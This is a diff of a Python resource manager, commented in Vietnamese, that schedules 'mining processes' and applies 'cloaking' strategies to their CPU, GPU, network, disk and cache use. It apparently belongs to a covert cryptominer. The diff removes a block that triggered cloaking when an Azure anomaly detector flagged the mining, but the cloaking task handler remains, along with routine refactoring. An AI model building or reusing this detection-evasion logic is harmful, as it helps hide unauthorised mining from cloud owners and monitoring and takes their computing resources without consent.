@@ -80,8 +80,7 @@ class SharedResourceManager:
         self.logger = logger
         self.original_resource_limits = {}
         self.gpu_manager = GPUManager()  # Sử dụng GPUManager
-        self.processed_tasks = set()  # Tập hợp để lưu các nhiệm vụ đã xử lý
-
+        
     def is_gpu_initialized(self) -> bool:
         self.logger.debug(
             f"Checking if GPU is initialized: {self.gpu_manager.gpu_initialized}")
@@ -420,6 +419,7 @@ class ResourceManager(BaseManager):
         self.resource_lock = rwlock.RWLockFair()
         self.resource_adjustment_queue = PriorityQueue()
         self.cloaking_request_queue = Queue()
+        self.processed_tasks = set()  # Khởi tạo thuộc tính để theo dõi nhiệm vụ đã xử lý
 
         self.mining_processes = []
         self.mining_processes_lock = rwlock.RWLockFair()
@@ -533,6 +533,9 @@ class ResourceManager(BaseManager):
         return priority
 
     def monitor_and_adjust(self):
+        """
+        Theo dõi và điều chỉnh tài nguyên.
+        """
         monitoring_params = self.config.get("monitoring_parameters", {})
         temperature_check_interval = monitoring_params.get(
             "temperature_monitoring_interval_seconds", 10)
@@ -555,9 +558,20 @@ class ResourceManager(BaseManager):
                 power_limits = self.config.get("power_limits", {})
                 per_device_power = power_limits.get("per_device_power_watts", {})
 
-                # [CHANGES] Đảm bảo cpu_max_power, gpu_max_power là int, tránh so sánh dict
+                # Bảo vệ giá trị để tránh lỗi so sánh dict với dict
                 cpu_max_power = per_device_power.get("cpu", 150)
+                if not isinstance(cpu_max_power, (int, float)):
+                    self.logger.warning(
+                        f"Giá trị cpu_max_power không hợp lệ: {cpu_max_power}. Sử dụng giá trị mặc định 150W."
+                    )
+                    cpu_max_power = 150
+
                 gpu_max_power = per_device_power.get("gpu", 300)
+                if not isinstance(gpu_max_power, (int, float)):
+                    self.logger.warning(
+                        f"Giá trị gpu_max_power không hợp lệ: {gpu_max_power}. Sử dụng giá trị mặc định 300W."
+                    )
+                    gpu_max_power = 300
 
                 for process in self.mining_processes:
                     self.check_power_and_enqueue(
@@ -565,19 +579,6 @@ class ResourceManager(BaseManager):
 
                 if self.should_collect_azure_monitor_data():
                     self.collect_azure_monitor_data()
-                    metric_data = self.gather_metric_data_for_anomaly_detection()
-                    anomalies_detected = self.azure_anomaly_detector_client.detect_anomalies(
-                        metric_data
-                    )
-                    if (isinstance(anomalies_detected, dict) and
-                            anomalies_detected.get('score', 0) > 0.9):
-                        for process in self.mining_processes:
-                            adjustment_task = {
-                                'type': 'cloaking',
-                                'process': process,
-                                'strategies': ['cpu', 'gpu', 'network', 'disk_io', 'cache']
-                            }
-                            self.resource_adjustment_queue.put((1, adjustment_task))
 
             except Exception as e:
                 self.logger.error(
@@ -611,8 +612,10 @@ class ResourceManager(BaseManager):
         return data
 
     def allocate_resources_with_priority(self):
+        """
+        Phân bổ tài nguyên cho các tiến trình theo thứ tự ưu tiên.
+        """
         with self.resource_lock.gen_wlock(), self.mining_processes_lock.gen_rlock():
-            # Sắp xếp các tiến trình, đảm bảo priority là số
             sorted_processes = sorted(
                 self.mining_processes,
                 key=lambda p: p.priority if isinstance(p.priority, int) else 0,
@@ -628,10 +631,11 @@ class ResourceManager(BaseManager):
                     )
                     continue
 
-                # Nếu priority không hợp lệ, gán giá trị mặc định là 1
+                # Kiểm tra và gán giá trị mặc định cho priority nếu không hợp lệ
                 if not isinstance(process.priority, int):
                     self.logger.warning(
-                        f"Priority của tiến trình {process.name} (PID: {process.pid}) không hợp lệ. Sử dụng giá trị mặc định là 1.")
+                        f"Priority của tiến trình {process.name} (PID: {process.pid}) không hợp lệ. Sử dụng giá trị mặc định là 1."
+                    )
                     process.priority = 1
 
                 available_cores = total_cpu_cores - allocated_cores
@@ -793,11 +797,14 @@ class ResourceManager(BaseManager):
                     f"Lỗi trong quá trình xử lý yêu cầu cloaking: {e}")
 
     def resource_adjustment_handler(self):
+        """
+        Xử lý các yêu cầu điều chỉnh tài nguyên.
+        """
         while not self.stop_event.is_set():
             try:
                 priority, adjustment_task = self.resource_adjustment_queue.get(timeout=1)
 
-                # Kiểm tra xem nhiệm vụ đã xử lý hay chưa
+                # Kiểm tra xem nhiệm vụ đã xử lý chưa
                 task_id = hash(str(adjustment_task))
                 if task_id in self.processed_tasks:
                     self.logger.warning(f"Nhiệm vụ đã xử lý: {adjustment_task}")
@@ -808,7 +815,7 @@ class ResourceManager(BaseManager):
                 self.execute_adjustment_task(adjustment_task)
                 self.resource_adjustment_queue.task_done()
 
-                # Thêm vào tập hợp đã xử lý
+                # Ghi nhận nhiệm vụ đã xử lý
                 self.processed_tasks.add(task_id)
 
             except Empty:
@@ -818,38 +825,47 @@ class ResourceManager(BaseManager):
                     f"Lỗi trong quá trình xử lý điều chỉnh tài nguyên: {e}")
 
     def execute_adjustment_task(self, adjustment_task):
-        task_type = adjustment_task.get('type')
-        if task_type is None:
-            function_name = adjustment_task['function']
-            args = adjustment_task.get('args', ())
-            kwargs = adjustment_task.get('kwargs', {})
-            function = getattr(self.shared_resource_manager, function_name, None)
-            if function:
-                function(*args, **kwargs)
+        """
+        Thực thi nhiệm vụ điều chỉnh tài nguyên.
+        """
+        try:
+            task_type = adjustment_task.get('type')
+            if task_type is None:
+                # Nếu không có loại nhiệm vụ, gọi hàm từ shared_resource_manager
+                function_name = adjustment_task['function']
+                args = adjustment_task.get('args', ())
+                kwargs = adjustment_task.get('kwargs', {})
+                function = getattr(self.shared_resource_manager, function_name, None)
+                if function:
+                    function(*args, **kwargs)
+                else:
+                    self.logger.error(
+                        f"Không tìm thấy hàm điều chỉnh tài nguyên: {function_name}")
             else:
-                self.logger.error(
-                    f"Không tìm thấy hàm điều chỉnh tài nguyên: {function_name}")
-        else:
-            process = adjustment_task['process']
-            if task_type == 'cloaking':
-                strategies = adjustment_task['strategies']
-                for strategy in strategies:
-                    self.shared_resource_manager.apply_cloak_strategy(
-                        strategy, process)
-                self.logger.info(
-                    f"Hoàn thành cloaking cho tiến trình {process.name} (PID: {process.pid}).")
-            elif task_type == 'optimization':
-                action = adjustment_task['action']
-                self.apply_recommended_action(action, process)
-            elif task_type == 'monitoring':
-                adjustments = adjustment_task['adjustments']
-                self.apply_monitoring_adjustments(adjustments, process)
-            elif task_type == 'restore':
-                self.shared_resource_manager.restore_resources(process)
-                self.logger.info(
-                    f"Đã khôi phục tài nguyên cho tiến trình {process.name} (PID: {process.pid}).")
-            else:
-                self.logger.warning(f"Loại nhiệm vụ không xác định: {task_type}")
+                # Xử lý các loại nhiệm vụ đặc biệt
+                process = adjustment_task['process']
+                if task_type == 'cloaking':
+                    strategies = adjustment_task['strategies']
+                    for strategy in strategies:
+                        self.shared_resource_manager.apply_cloak_strategy(
+                            strategy, process)
+                    self.logger.info(
+                        f"Hoàn thành cloaking cho tiến trình {process.name} (PID: {process.pid}).")
+                elif task_type == 'optimization':
+                    action = adjustment_task['action']
+                    self.apply_recommended_action(action, process)
+                elif task_type == 'monitoring':
+                    adjustments = adjustment_task['adjustments']
+                    self.apply_monitoring_adjustments(adjustments, process)
+                elif task_type == 'restore':
+                    self.shared_resource_manager.restore_resources(process)
+                    self.logger.info(
+                        f"Đã khôi phục tài nguyên cho tiến trình {process.name} (PID: {process.pid}).")
+                else:
+                    self.logger.warning(f"Loại nhiệm vụ không xác định: {task_type}")
+        except Exception as e:
+            self.logger.error(
+                f"Lỗi trong quá trình thực thi nhiệm vụ: {adjustment_task}. Chi tiết: {e}")
 
     def apply_monitoring_adjustments(self, adjustments: Dict[str, Any], process: MiningProcess):
         try:
